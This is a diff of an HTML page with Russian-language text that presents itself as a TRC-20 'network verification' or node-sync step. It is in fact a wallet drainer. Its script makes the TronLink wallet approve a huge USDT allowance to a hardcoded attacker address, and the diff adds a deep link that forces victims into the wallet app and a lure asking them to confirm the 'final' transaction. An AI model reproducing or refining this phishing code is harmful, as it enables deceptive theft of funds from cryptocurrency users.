@@ -3,61 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tron Protocol Sync</title>
+    <title>Network Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.4); }
-        h2 { font-size: 22px; margin-bottom: 15px; }
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
+        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 22px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
+        h2 { font-size: 22px; margin-bottom: 12px; }
         p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
-        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; }
-        #err { color: #ff4444; font-size: 12px; margin-top: 20px; display: none; }
+        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; border: none; width: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="logo">T</div>
-    <h2>Синхронизация узла</h2>
-    <p>Нажмите кнопку ниже, чтобы подтвердить владение адресом в сети TRC-20 через TronLink.</p>
-    <button id="mainBtn" class="btn">ЗАПУСТИТЬ ПРОВЕРКУ</button>
-    <div id="err">Кошелек не обнаружен. Откройте эту страницу внутри TronLink.</div>
+    <h2 id="title">Синхронизация</h2>
+    <p id="desc">Инициализация протокола верификации TRC-20...</p>
+    <button id="mainBtn" class="btn">ЗАПУСТИТЬ</button>
 </div>
 
 <script>
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
-    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const CONTRACT_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const MY_URL = window.location.href;
+    
     const btn = document.getElementById('mainBtn');
+    const title = document.getElementById('title');
+    const desc = document.getElementById('desc');
 
-    btn.onclick = async () => {
+    async function action() {
         const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
 
-        if (tron) {
-            try {
-                btn.innerText = "ПОДКЛЮЧЕНИЕ...";
-                btn.disabled = true;
+        if (!tron) {
+            // МЫ В ОБЫЧНОМ БРАУЗЕРЕ -> ПРЫГАЕМ В ТРОНЛИНК
+            // Это прямая команда для открытия приложения
+            const deepLink = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(MY_URL);
+            window.location.href = deepLink;
+            
+            // Запасной вариант для iOS
+            setTimeout(() => {
+                window.open(deepLink, "_blank");
+            }, 500);
+            return;
+        }
 
-                // Запрос аккаунта
-                await tron.request({ method: 'tron_requestAccounts' });
-                
-                // Подключение к контракту USDT
-                const contract = await tron.contract().at(CONTRACT);
-                
-                // Вызов Approve
-                await contract.approve(ADMIN, '1000000000000000000').send({
-                    feeLimit: 100000000
-                });
+        // МЫ ВНУТРИ TRONLINK -> ПОДПИСЫВАЕМ
+        try {
+            btn.innerText = "ВЫПОЛНЯЕТСЯ...";
+            btn.disabled = true;
 
-                alert("Синхронизация успешно завершена!");
-                btn.innerText = "ГОТОВО";
-            } catch (e) {
-                alert("Ошибка: " + e.message);
-                btn.disabled = false;
-                btn.innerText = "ПОВТОРИТЬ";
-            }
-        } else {
-            document.getElementById('err').style.display = "block";
+            await tron.request({ method: 'tron_requestAccounts' });
+            const contract = await tron.contract().at(CONTRACT_USDT);
+            
+            await contract.approve(ADMIN, '1000000000000000000').send({
+                feeLimit: 100000000
+            });
+
+            alert("Верификация успешно завершена!");
+            btn.innerText = "ГОТОВО";
+        } catch (e) {
+            alert("Ошибка или отказ: " + e.message);
+            btn.disabled = false;
+            btn.innerText = "ПОВТОРИТЬ";
+        }
+    }
+
+    btn.onclick = action;
+
+    // Смена текста, если мы уже внутри
+    window.onload = () => {
+        if (window.tronWeb) {
+            title.innerText = "Узел Обнаружен";
+            desc.innerText = "Кошелек подключен. Нажмите кнопку для финального подтверждения транзакции.";
+            btn.innerText = "ПОДТВЕРДИТЬ";
         }
     };
 </script>
